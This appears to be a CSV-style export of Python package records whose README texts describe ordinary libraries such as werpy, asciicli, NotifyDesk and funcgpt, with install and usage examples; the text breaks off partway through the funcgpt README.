![werpy-logo-word-error-rate](https://user-images.githubusercontent.com/52817125/235063664-2f21629c-0fad-46b6-a487-c2b5ef6f80e9.png)
# werpy - Word Error Rate for Python

[![Python Version](https://img.shields.io/badge/python-3.8%7C3.9%7C3.10%7C3.11-blue?logo=python&logoColor=ffdd54)](https://www.python.org/downloads/)  
[![werpy License](https://img.shields.io/badge/License-BSD_3--Clause-blue.svg)](https://github.com/analyticsinmotion/werpy/blob/main/LICENSE)  
![Maintained](https://img.shields.io/badge/Maintained%3F-yes-green.svg)  


## What is it?
**werpy** is a powerful yet lightweight Python package that rapidly calculates and analyzes the Word Error Rate (WER) between two sets of text. 
It has been designed with the flexibility to handle multiple input data types such as strings, lists and numpy arrays.

The package also includes a full set of features such as normalizing the input text to account for data collection variability and the capability to easily assign different weights/penalties to specific error classifications (insertions, deletions, and substitutions).
Additionally, the summary function provides a comprehensive breakdown of the calculated results to assist in analyzing the specific errors quickly and in more detail.


## Installation
You can install the latest **werpy** release with Python's pip package manager:

```python
# install werpy via PyPi
pip install werpy
```

## Main Functions
The following table provides an overview of the functions that can be used in werpy.

| Function  | Description | 
| ------------- | ------------- |
| normalize(text)  | Preprocess input text to remove punctuation, remove duplicated spaces, leading/trailing blanks and convert all words to lowercase. |
| wer(reference, hypothesis)  | Calculate the overall Word Error Rate for the entire reference and hypothesis texts. |
| wers(reference, hypothesis)  | Calculates a list of the Word Error Rates for each of the reference and hypothesis texts. |
| werp(reference, hypothesis)  | Calculates a weighted Word Error Rate for the entire reference and hypothesis texts. |
| werps(reference, hypothesis)  | Calculates a list of weighted Word Error Rates for each of the reference and hypothesis texts. |
| summary(reference, hypothesis)  | Provides a comprehensive breakdown of the calculated results including the WER, Levenshtein Distance and all the insertion, deletion and substitution errors. |


## Usage
**Import the werpy package**
```python
>>> import werpy
```

**Example 1 - Normalize a list of text**
```python
>>> input_data = [""It's very popular in Antarctica."",""The Sugar Bear character""]
>>> reference = werpy.normalize(input_data)
>>> print(reference)
['its very popular in antarctica', 'the sugar bear character']
```

**Example 2 - Calculate the overall Word Error Rate on a set of strings**
```python
>>> wer = werpy.wer('i love cold pizza', 'i love pizza')
>>> print(wer)
0.25
```

**Example 3 - Calculate the overall Word Error Rate on a set of lists**
```python
>>> ref = ['i love cold pizza','the sugar bear character was popular']
>>> hyp = ['i love pizza','the sugar bare character was popular']
>>> wer = werpy.wer(ref, hyp)
>>> print(wer)
0.2
```

**Example 4 - Calculate the Word Error Rates for each set of texts**
```python
>>> ref = ['no one else could claim that','she cited multiple reasons why']
>>> hyp = ['no one else could claim that','she sighted multiple reasons why']
>>> wers = werpy.wers(ref, hyp)
>>> print(wers)
[0.0, 0.2]
```

**Example 5 - Calculate the weighted Word Error Rates for the entire set of text**
```python
>>> ref = ['it was beautiful and sunny today']
>>> hyp = ['it was a beautiful and sunny day']
>>> werp = werpy.werp(ref, hyp, insertions_weight=0.5, deletions_weight=0.5, substitutions_weight=1)
>>> print(werp)
0.25
```

**Example 6 - Calculate a list of weighted Word Error Rates for each of the reference and hypothesis texts**
```python
>>> ref = ['it blocked sight lines of central park', 'her father was an alderman in the city government']
>>> hyp = ['it blocked sightlines of central park', 'our father was an elder man in the city government']
>>> werps = werpy.werps(ref, hyp, insertions_weight = 0.5, deletions_weight = 0.5, substitutions_weight = 1)
>>> print(werps)
[0.21428571428571427, 0.2777777777777778]
```

**Example 7 - Provide a complete breakdown of the Word Error Rate calculations for each of the reference and hypothesis texts**
```python
>>> ref = ['it is consumed domestically and exported to other countries', 'rufino street in makati right inside the makati central business district', 'its estuary is considered to have abnormally low rates of dissolved oxygen', 'he later cited his first wife anita as the inspiration for the song', 'no one else could claim that']
>>> hyp = ['it is consumed domestically and exported to other countries', 'rofino street in mccauti right inside the macasi central business district', 'its estiary is considered to have a normally low rates of dissolved oxygen', 'he later sighted his first wife anita as the inspiration for the song', 'no one else could claim that']
>>> summary = werpy.summary(ref, hyp)
>>> print(summary)
```




![werpy-example-summary-results-word-error-rate-breakdown](https://user-images.githubusercontent.com/52817125/234950114-7efcce9b-7a76-4413-830f-7deda20cad75.png)



## Dependencies
 - NumPy - Provides an assortment of routines for fast operations on arrays
 - Pandas - Powerful data structures for data analysis, time series, and statistics

## Licensing

``werpy`` is released under the terms of the BSD 3-Clause License. Please refer to the LICENSE file for full details.

This project also includes third-party packages distributed under the BSD-3-Clause license, including NumPy and Pandas.

The full NumPy and Pandas licenses can be found in the LICENSES directory in this repository. 

They can also be found directly in the following source codes:

 - NumPy - https://github.com/numpy/numpy/blob/main/LICENSE.txt
 - Pandas - https://github.com/pandas-dev/pandas/blob/main/LICENSE
",analyticsinmotion/werpy
asciicli,https://github.com/mrq-andras/asciicli,1,2537,2537,"---
  
""   35005550    22           666     666             165         ""  
""  002          77    003    555     555             350         ""  
"" 056                155677  555     555             3554 337    ""  
"" 053   89889   00   4559    55555555555  006   400  3557   008  ""  
"" 059     300   00    051    555     555  059   700  350    850  ""  
"" 3007    700   00    053    555     555  059   400  350    950  ""  
""   900988500   00    90034  000     000  800371650  205847805   ""  
  
---

# Command Line ASCII Art Generator

ASCIIcli is a command line interface that is powered by Python3. You can generate ASCII art by importing an image and then selecting the character set that you want to generate with.

## Installation & Building

### PIP

The easiest way to install ASCIIcli is by using the [PyPI library](https://pypi.org/project/asciicli/).
You can run `pip install ASCIIcli` on any command-line with Python3 in order to install it.

### Releases

If you are unable to use the PyPI library you can access ASCIIcli by going to our [releases page](https://github.com/mrq-andras/asciicli/releases). There you can download the .exe file and run the CLI by going to the folder that the program is downloaded in and running `.\asciicli`

---

## Usage

`asciicli [-h] [--percent] [--set] [--random] [--invert] [--darkness] C:/full/path/to/your/image`

Set 1: A --> Z  
Set 2: 0 --> 9  
Set 3: 0, O, o, 8, 9, 6, @, &, ., "", :  
Set 4: ▀, ▄, ▌, ▐, ■, ◽, ◆, ►, ●, ░, ▒, ▓, █  
Set 5: !, @, #, $, %, ^, &, *, (, ), _, +, -, =  

**_NOTE: SET 5 MIGHT NOT DISPLAY CORRECTLY IN CERTAIN FONTS OR EDITORS_**

If you have downloaded the application through pip input the following command in the terminal:  
`asciicli --percent 20 --set 1 --random True C:/full/path/to/your/image`

If you are running the .exe package you will need to slightly alter the command by calling the exact folder of ASCIIcli  
`.\path\to\asciicli.exe --percent 20 --set 1 --random True C:/full/path/to/your/image`

Assuming the file is 1024x219, this command will generate a .txt file that is 21 lines long with each line taking up 201 characters using the character set to one. The `--set 1` variable is optional as the default character set is one. Random has been set to true and it will take the image from assets/input.jpg and generate a .txt file titled input-ascii.jpg in the same folder as the image.

Random and Invert are boolians and must be set to True/False, whereas Darkness, Set, Height and Width are all integers.

---
[`LICENSE`](./LICENSE)
","---
  
""   35005550    22           666     666             165         ""  
""  002          77    003    555     555             350         ""  
"" 056                155677  555     555             3554 337    ""  
"" 053   89889   00   4559    55555555555  006   400  3557   008  ""  
"" 059     300   00    051    555     555  059   700  350    850  ""  
"" 3007    700   00    053    555     555  059   400  350    950  ""  
""   900988500   00    90034  000     000  800371650  205847805   ""  
  
---

# Command Line ASCII Art Generator

ASCIIcli is a command line interface that is powered by Python3. You can generate ASCII art by importing an image and then selecting the character set that you want to generate with.

## Installation & Building

### PIP

The easiest way to install ASCIIcli is by using the [PyPI library](https://pypi.org/project/asciicli/).
You can run `pip install ASCIIcli` on any command-line with Python3 in order to install it.

### Releases

If you are unable to use the PyPI library you can access ASCIIcli by going to our [releases page](https://github.com/mrq-andras/asciicli/releases). There you can download the .exe file and run the CLI by going to the folder that the program is downloaded in and running `.\asciicli`

---

## Usage

`asciicli [-h] [--percent] [--set] [--random] [--invert] [--darkness] C:/full/path/to/your/image`

Set 1: A --> Z  
Set 2: 0 --> 9  
Set 3: 0, O, o, 8, 9, 6, @, &, ., "", :  
Set 4: ▀, ▄, ▌, ▐, ■, ◽, ◆, ►, ●, ░, ▒, ▓, █  
Set 5: !, @, #, $, %, ^, &, *, (, ), _, +, -, =  

**_NOTE: SET 5 MIGHT NOT DISPLAY CORRECTLY IN CERTAIN FONTS OR EDITORS_**

If you have downloaded the application through pip input the following command in the terminal:  
`asciicli --percent 20 --set 1 --random True C:/full/path/to/your/image`

If you are running the .exe package you will need to slightly alter the command by calling the exact folder of ASCIIcli  
`.\path\to\asciicli.exe --percent 20 --set 1 --random True C:/full/path/to/your/image`

Assuming the file is 1024x219, this command will generate a .txt file that is 21 lines long with each line taking up 201 characters using the character set to one. The `--set 1` variable is optional as the default character set is one. Random has been set to true and it will take the image from assets/input.jpg and generate a .txt file titled input-ascii.jpg in the same folder as the image.

Random and Invert are boolians and must be set to True/False, whereas Darkness, Set, Height and Width are all integers.

---
[`LICENSE`](./LICENSE)
",mrq-andras/asciicli
odoo-addon-purchase-order-qty-by-product-category,https://github.com/OCA/purchase-workflow,1,3715,3290,"========================================
Purchase - Order Qty By Product Category
========================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fpurchase--workflow-lightgray.png?logo=github
    :target: https://github.com/OCA/purchase-workflow/tree/15.0/purchase_order_qty_by_product_category
    :alt: OCA/purchase-workflow
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/purchase-workflow-15-0/purchase-workflow-15-0-purchase_order_qty_by_product_category
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/142/15.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module is used to display product quantities involved in a PO grouped by product category.

**Table of contents**

.. contents::
   :local:

Usage
=====

Once the module is installed, you can configure whether quantities should be split by UoM by default.
To do so, you can:

1. configure an ``ir.config_parameter`` record, with key ""purchase_ordered_qty_by_product_category.split_by_uom"" and value ""1""

2. go to the Purchase settings and flag the ""Split Quantity Category By UoM"" checkbox

You can also configure whether reference UoM should be used for grouping. To do so, you can:

1. configure an ``ir.config_parameter`` record, with key ""purchase_ordered_qty_by_product_category.split_by_uom_reference"" and value ""1""

2. go to the Purchase settings and flag the ""Split Quantity Category By Reference UoM"" checkbox

NB: splitting by reference UoM is available only if splitting by UoM is activated first.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/purchase-workflow/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/purchase-workflow/issues/new?body=module:%20purchase_order_qty_by_product_category%0Aversion:%2015.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Camptocamp
* Italo Lopes

Contributors
~~~~~~~~~~~~

* Italo Lopes <italo.lopes@camptocamp.com>
* Silvio Gregorini <silvio.gregorini@camptocamp.com>

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/purchase-workflow <https://github.com/OCA/purchase-workflow/tree/15.0/purchase_order_qty_by_product_category>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","========================================
Purchase - Order Qty By Product Category
========================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fpurchase--workflow-lightgray.png?logo=github
    :target: https://github.com/OCA/purchase-workflow/tree/15.0/purchase_order_qty_by_product_category
    :alt: OCA/purchase-workflow
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/purchase-workflow-15-0/purchase-workflow-15-0-purchase_order_qty_by_product_category
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/142/15.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module is used to display product quantities involved in a PO grouped by product category.

**Table of contents**

.. contents::
   :local:

Usage
=====

Once the module is installed, you can configure whether quantities should be split by UoM by default.
To do so, you can:

1. configure an ``ir.config_parameter`` record, with key ""purchase_ordered_qty_by_product_category.split_by_uom"" and value ""1""

2. go to the Purchase settings and flag the ""Split Quantity Category By UoM"" checkbox

You can also configure whether reference UoM should be used for grouping. To do so, you can:

1. configure an ``ir.config_parameter`` record, with key ""purchase_ordered_qty_by_product_category.split_by_uom_reference"" and value ""1""

2. go to the Purchase settings and flag the ""Split Quantity Category By Reference UoM"" checkbox

NB: splitting by reference UoM is available only if splitting by UoM is activated first.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Camptocamp
* Italo Lopes

Contributors
~~~~~~~~~~~~

* Italo Lopes 
* Silvio Gregorini 

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/purchase-workflow `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/purchase-workflow
pb-graphene,https://github.com/gpabois/pb-graphene,5,0,0,,,gpabois/pb-graphene
shedding-py,https://github.com/toolifelesstocode/shedding.py,1,183,183,"# shedding.py

Shedding.py is a Python wrapper for the EskomSePush API. It provides a simple interface to the API, and handles all the authentication and session management for you.

","# shedding.py

Shedding.py is a Python wrapper for the EskomSePush API. It provides a simple interface to the API, and handles all the authentication and session management for you.

",toolifelesstocode/shedding.py
single-consumer-queue,https://github.com/LukasKrocek/single-consumer-queue-python,0,1770,1770,"# Single Consumer Queue
Single Consumer Queue is a Python library that provides an alternative to the standard asyncio.Queue for single consumer scenarios. It consists of two classes: SingleConsumerQueue and SingleConsumerPriorityQueue. Both classes implement the AbstractSingleConsumerQueue abstract base class, which provides the basic functionality of a single consumer queue.

## Why Single Consumer Queue?
In some scenarios, the standard asyncio.Queue can be slower than necessary. This is because asyncio.Queue is designed to be used with multiple consumers, which means that it has additional overhead to handle multiple concurrent accesses. If you only have one consumer, you can use SingleConsumerQueue or SingleConsumerPriorityQueue to reduce this overhead and improve performance.

## How to use Single Consumer Queue
Installation
You can install Single Consumer Queue using pip:

```pip install single-consumer-queue```

## Usage
Here's an example of how to use SingleConsumerQueue:

```
async def consumer(queue: SingleConsumerQueue | SingleConsumerPriorityQueue):
    async for item in queue.start_consuming():
        print(item)
```

SingleConsumerQueue raises exception if you try to add multiple consumers:

```
async def consumer(queue: SingleConsumerQueue | SingleConsumerPriorityQueue):
    async for item in queue.start_consuming():
        print(item)

queue = SingleConsumerQueue()
asyncio.create_task(consumer(queue))
await asyncio sleep(0.1)
await queue.get()  # raises runtime error
```

Lock is checked and acquired when consumer starts and every time that get is awaited.

Get has considerate overhead because it has to use lock every time, so it is recommended to use `start_consuming` generator when you want to consume items in the loop.
","# Single Consumer Queue
Single Consumer Queue is a Python library that provides an alternative to the standard asyncio.Queue for single consumer scenarios. It consists of two classes: SingleConsumerQueue and SingleConsumerPriorityQueue. Both classes implement the AbstractSingleConsumerQueue abstract base class, which provides the basic functionality of a single consumer queue.

## Why Single Consumer Queue?
In some scenarios, the standard asyncio.Queue can be slower than necessary. This is because asyncio.Queue is designed to be used with multiple consumers, which means that it has additional overhead to handle multiple concurrent accesses. If you only have one consumer, you can use SingleConsumerQueue or SingleConsumerPriorityQueue to reduce this overhead and improve performance.

## How to use Single Consumer Queue
Installation
You can install Single Consumer Queue using pip:

```pip install single-consumer-queue```

## Usage
Here's an example of how to use SingleConsumerQueue:

```
async def consumer(queue: SingleConsumerQueue | SingleConsumerPriorityQueue):
    async for item in queue.start_consuming():
        print(item)
```

SingleConsumerQueue raises exception if you try to add multiple consumers:

```
async def consumer(queue: SingleConsumerQueue | SingleConsumerPriorityQueue):
    async for item in queue.start_consuming():
        print(item)

queue = SingleConsumerQueue()
asyncio.create_task(consumer(queue))
await asyncio sleep(0.1)
await queue.get()  # raises runtime error
```

Lock is checked and acquired when consumer starts and every time that get is awaited.

Get has considerate overhead because it has to use lock every time, so it is recommended to use `start_consuming` generator when you want to consume items in the loop.
",lukaskrocek/single-consumer-queue-python
notifydesk,https://github.com/krator3/NotifyDesk,0,4475,4475,"# NotifyDesk

EN:

The NotifyDesk library provides an easy way to send notifications in Linux.
To work, notify-send is used from the libnotify-bin package, which is preinstalled on most Linux systems.
The library is able to work together with QT/GTK.
You can use it to output important information, to notify about an error in the program, and in many other cases.

Arguments:
- title: defines the title of the notification. The default value is ""Title""
- message: defines the text of the notification. The default value is ""Message""
- delay: specifies the delay in seconds until the notification appears on the desktop. The default value is 0.
- icon: contains the path to the file in the format .ico to display the icon in the notification.
  To work correctly, you should use a relative path. The default value is None.
  The relative path is the path to the file relative to the current directory (the one in which the program is running)

P.S: title and message accept the str type (other types are not recommended, but it is also possible)); delay accepts int and float; icon accepts only str

Return values:
- True: when the notification is sent successfully.
- False: if the notification was sent unsuccessfully.

Usage examples:
   from NotifyDesk import push or import NotifyDesk ( In this case, you need to write NotifyDesk.push() )

1. Sending a standard notification:
   push(title=""NotifyDesk"", message=""Test message"")

2. Sending a notification with an icon:
   push(title=""NotifyDesk"", message=""Test message"", icon=""path"")
P.S: Instead of your own icon, you can use the built-in icons.
   A list with them (perhaps not complete) can be found on the project's GitHub ( https://github.com/krator3/NotifyDesk )
Or you can search for these names on the internet.

3. Sending a delayed notification:
   push(title=""NotifyDesk"", message=""Test message"", delay=6) # the notification will appear 6 seconds after calling the push() function

4. Sending a notification with a delay and an icon:
   push(title=""NotifyDesk"", message=""Test message"", delay=3, icon=""path"") # example of combining arguments

P.S: If the path to the icon is not correct and it is not the name of the built-in icon, then an icon will be displayed signaling this.



RU:

Библиотека NotifyDesk предоставляет простой способ отправки уведомлений в Linux.
Для работы используется notify-send из пакета libnotify-bin, который предустановлен в большинстве систем Linux.
Библиотека способна работать вместе с QT/GTK.
Вы можете использовать её для вывода важной информации, для уведомления об ошибке в программе и во многих других случаях.

Аргументы:
- title: определяет заголовок уведомления. Значение по умолчанию - ""Title""
- message: определяет текст уведомления. Значение по умолчанию - ""Message""
- delay: указывает задержку в секундах до появления уведомления на рабочем столе. Значение по умолчанию - 0.
- icon: содержит путь к файлу в формате .ico для отображения иконки в уведомлении.
  Для корректной работы следует использовать относительный путь. Значение по умолчанию - None.
  Относительный путь — это путь к файлу относительно текущего каталога (тот, в котором запускается программа)

P.S: title и message принимают тип str (другие типы не рекомендуется, но тоже можно) ); delay принимает int и float; icon принимает только str

Возвращаемые значения:
- True: при успешной отправке уведомления.
- False: при неудачной отправке уведомления.

Примеры использования:
   from NotifyDesk import push или import NotifyDesk ( В таком случае нужно писать NotifyDesk.push() )

1. Отправка стандартного уведомления:
   push(title=""NotifyDesk"", message=""Тестовое сообщение"")

2. Отправка уведомления с иконкой:
   push(title=""NotifyDesk"", message=""Тестовое сообщение"", icon=""path"")
   P.S: вместо собственной иконки вы можете использовать встроенные иконки.
   Список с ними (возможно не полный) вы сможете найти на GitHub проекта ( https://github.com/krator3/NotifyDesk )
   Или вы можете поискать эти названия в интернете.

3. Отправка уведомления с задержкой:
   push(title=""NotifyDesk"", message=""Тестовое сообщение"", delay=6) # уведомление появится через 6 секунд после вызова функции push()

4. Отправка уведомления с задержкой и иконкой:
   push(title=""NotifyDesk"", message=""Тестовое сообщение"", delay=3, icon=""path"") # пример комбинирования аргументов

P.S: Если путь до иконки не верен и это не является названием встроенной иконки, то будет отображаться значок, сигнализирующий об этом.


","# NotifyDesk

EN:

The NotifyDesk library provides an easy way to send notifications in Linux.
To work, notify-send is used from the libnotify-bin package, which is preinstalled on most Linux systems.
The library is able to work together with QT/GTK.
You can use it to output important information, to notify about an error in the program, and in many other cases.

Arguments:
- title: defines the title of the notification. The default value is ""Title""
- message: defines the text of the notification. The default value is ""Message""
- delay: specifies the delay in seconds until the notification appears on the desktop. The default value is 0.
- icon: contains the path to the file in the format .ico to display the icon in the notification.
  To work correctly, you should use a relative path. The default value is None.
  The relative path is the path to the file relative to the current directory (the one in which the program is running)

P.S: title and message accept the str type (other types are not recommended, but it is also possible)); delay accepts int and float; icon accepts only str

Return values:
- True: when the notification is sent successfully.
- False: if the notification was sent unsuccessfully.

Usage examples:
   from NotifyDesk import push or import NotifyDesk ( In this case, you need to write NotifyDesk.push() )

1. Sending a standard notification:
   push(title=""NotifyDesk"", message=""Test message"")

2. Sending a notification with an icon:
   push(title=""NotifyDesk"", message=""Test message"", icon=""path"")
P.S: Instead of your own icon, you can use the built-in icons.
   A list with them (perhaps not complete) can be found on the project's GitHub ( https://github.com/krator3/NotifyDesk )
Or you can search for these names on the internet.

3. Sending a delayed notification:
   push(title=""NotifyDesk"", message=""Test message"", delay=6) # the notification will appear 6 seconds after calling the push() function

4. Sending a notification with a delay and an icon:
   push(title=""NotifyDesk"", message=""Test message"", delay=3, icon=""path"") # example of combining arguments

P.S: If the path to the icon is not correct and it is not the name of the built-in icon, then an icon will be displayed signaling this.



RU:

Библиотека NotifyDesk предоставляет простой способ отправки уведомлений в Linux.
Для работы используется notify-send из пакета libnotify-bin, который предустановлен в большинстве систем Linux.
Библиотека способна работать вместе с QT/GTK.
Вы можете использовать её для вывода важной информации, для уведомления об ошибке в программе и во многих других случаях.

Аргументы:
- title: определяет заголовок уведомления. Значение по умолчанию - ""Title""
- message: определяет текст уведомления. Значение по умолчанию - ""Message""
- delay: указывает задержку в секундах до появления уведомления на рабочем столе. Значение по умолчанию - 0.
- icon: содержит путь к файлу в формате .ico для отображения иконки в уведомлении.
  Для корректной работы следует использовать относительный путь. Значение по умолчанию - None.
  Относительный путь — это путь к файлу относительно текущего каталога (тот, в котором запускается программа)

P.S: title и message принимают тип str (другие типы не рекомендуется, но тоже можно) ); delay принимает int и float; icon принимает только str

Возвращаемые значения:
- True: при успешной отправке уведомления.
- False: при неудачной отправке уведомления.

Примеры использования:
   from NotifyDesk import push или import NotifyDesk ( В таком случае нужно писать NotifyDesk.push() )

1. Отправка стандартного уведомления:
   push(title=""NotifyDesk"", message=""Тестовое сообщение"")

2. Отправка уведомления с иконкой:
   push(title=""NotifyDesk"", message=""Тестовое сообщение"", icon=""path"")
   P.S: вместо собственной иконки вы можете использовать встроенные иконки.
   Список с ними (возможно не полный) вы сможете найти на GitHub проекта ( https://github.com/krator3/NotifyDesk )
   Или вы можете поискать эти названия в интернете.

3. Отправка уведомления с задержкой:
   push(title=""NotifyDesk"", message=""Тестовое сообщение"", delay=6) # уведомление появится через 6 секунд после вызова функции push()

4. Отправка уведомления с задержкой и иконкой:
   push(title=""NotifyDesk"", message=""Тестовое сообщение"", delay=3, icon=""path"") # пример комбинирования аргументов

P.S: Если путь до иконки не верен и это не является названием встроенной иконки, то будет отображаться значок, сигнализирующий об этом.


",krator3/notifydesk
django-rest-commons,https://github.com/LeOndaz/drf-rest-commons,0,0,0,,,leondaz/drf-rest-commons
gbc,https://github.com/gopherball/gbc,0,114,114,"![gb logo, a gopher in a ball](https://src.tty.cat/supakeen/gb/raw/branch/master/doc/_static/logo-doc.png)

# gbc
","![gb logo, a gopher in a ball](https://src.tty.cat/supakeen/gb/raw/branch/master/doc/_static/logo-doc.png)

# gbc
",gopherball/gbc
skylab,https://github.com/SerhiiStets/skylab,6,823,823,"# Skylab

Skylab is a text user interface (TUI) tool that displays upcoming space launches in a user-friendly way.

## Instalation

To install Skylab using pip, run the following command:

```
$ pip install skylab
```

## Usage

To use Skylab, simply enter the following command in your terminal:

```
$ skylab
```

## Contributing

Help in testing, development, documentation and other tasks is
highly appreciated and useful to the project.

To get started with developing skylab, see [CONTRIBUTING.md](CONTRIBUTING.md).

## Acknowledgments

This project makes use of the [The Space Devs API](https://thespacedevs.com/) to retrieve data about upcoming space launches. We would like to thank the creators of this API for providing this valuable service.

## License

Skylab is released under the [MIT License](LICENSE.md).
","# Skylab

Skylab is a text user interface (TUI) tool that displays upcoming space launches in a user-friendly way.

## Instalation

To install Skylab using pip, run the following command:

```
$ pip install skylab
```

## Usage

To use Skylab, simply enter the following command in your terminal:

```
$ skylab
```

## Contributing

Help in testing, development, documentation and other tasks is
highly appreciated and useful to the project.

To get started with developing skylab, see [CONTRIBUTING.md](CONTRIBUTING.md).

## Acknowledgments

This project makes use of the [The Space Devs API](https://thespacedevs.com/) to retrieve data about upcoming space launches. We would like to thank the creators of this API for providing this valuable service.

## License

Skylab is released under the [MIT License](LICENSE.md).
",serhiistets/skylab
rwexptest,https://github.com/pypa/sampleproject,2,176,176,"# Example Package

This is a simple example package. You can use
[Github-flavored Markdown](https://guides.github.com/features/mastering-markdown/)
to write your content.
","# Example Package

This is a simple example package. You can use
[Github-flavored Markdown](https://guides.github.com/features/mastering-markdown/)
to write your content.
",pypa/sampleproject
autora-workflow,https://github.com/AutoResearch/autora-workflow,6,18,18,"# AutoRA Workflow
","# AutoRA Workflow
",autoresearch/autora-workflow
sa-node-architecture,https://github.com/Simply-Artificial/NodeArchitecture,0,59,59,"# Node Architecture
> **Note**   
> README to be completed
","# Node Architecture
> **Note**   
> README to be completed
",simply-artificial/nodearchitecture
funcgpt,https://github.com/leandropls/funcgpt,0,2360,2360,"# funcgpt: Python library for creating functions with OpenAI's GPT

funcgpt is an easy-to-use Python library that allows you to quickly create Python functions using the power of OpenAI's GPT models. With just a few lines of code, you can create functions that generate human-like responses, answer questions, or anything else that GPT is capable of.

## Features

- Easy to use decorator for creating functions based on GPT models
- Supports different GPT model versions
- Customize GPT's behavior with adjustable temperature values
- Generate responses in streaming or non-streaming modes

## Installation

To install funcgpt, use pip:

```bash
pip install funcgpt
```

## Usage

To create a function that answers questions like a pirate, you can use the following snippet:

```python
from funcgpt import gpt

@gpt
def answer_like_pirate(message: str) -> str:
    """"""Answer questions like a pirate.""""""
    ...

```

Usage:

```python
>>> answer_like_pirate(""How are you doing today?"")
""Arrr, I be doin' fine, matey.""
```

To do the same thing, but with a function that streams responses, you can use the following snippet:

```python
from typing import Iterator
from funcgpt import gpt

@gpt
def stream_like_pirate(message: str) -> Iterator[str]:
    """"""Answers questions like a pirate.""""""
    ...

```

Usage:

```python
>>> for token in stream_like_pirate(""How are you doing today?""):
...     print(token, end="""", flush=True)
...
Arrr, I be doin' fine, matey.
```

For defining a function that returns a boolean value, you can use the following snippet:

```python
from funcgpt import gpt

@gpt
def is_pirate(message: str) -> bool:
    """"""Returns true if the message is from a pirate.""""""
    ...

```

Usage:

```python
>>> is_pirate(""Arrr, I be doin' fine, matey."")
True
```

For choosing a different model or temperature, you can use the `model` and `temperature` keyword arguments:

```python
from funcgpt import gpt

@gpt(model=""gpt-4"", temperature=0)
def answer_like_pirate(message: str) -> str:
    """"""Answer questions like a pirate.""""""
    ...

```

## Contributing

We welcome contributions! Please feel free to fork the repository, make changes, and submit pull requests. If you have any questions or ideas, don't hesitate to open an issue.

## License

funcgpt is released under the MIT License. See the [LICENSE](LICENSE) file for more details.
","# funcgpt: Python library for creating functions with OpenAI's GPT

funcgpt is an easy-to-use Python library that allows you to quickly create Python functions using the power of OpenAI's GPT models. With just a few lines of code, you can create functions that generate human-like responses, answer questions, or anything else that GPT is capable of.

## Features

- Easy to use decorator for creating functions based on GPT models
- Supports different GPT model versions
- Customize GPT's behavior with adjustable temperature values
- Generate responses in streaming or non-streaming modes

## Installation

To install funcgpt, use pip:

```bash
pip install funcgpt
```

## Usage

To create a function that answers questions like a pirate, you can use the following snippet:

```python
from funcgpt import gpt

@gpt
def answer_like_pirate(message: str) -> str:
    """"""Answer questions like a pirate.""""""
    ...

```

Usage:

```python
>>> answer_like_pirate(""How are you doing today?"")
""Arrr, I be doin' fine, matey.""
```

To do the same thing, but with a function that streams responses, you can use the following snippet:

```python
from typing import Iterator
from funcgpt import gpt

@gpt
def stream_like_pirate(message: str) -> Iterator[str]:
    """"""Answers questions like a pirate.""""""
    ...

```

Usage:

```python
>>> for token in stream_like_pirate(""How are you doing today?""):
...     print(token, end="""", flush=True)
...
Arrr, I be doin' fine, matey.
```

For defining a function that returns a boolean value, you can use the following snippet:

```python
from funcgpt import gpt

@gpt
def is_pirate(message: str) -> bool:
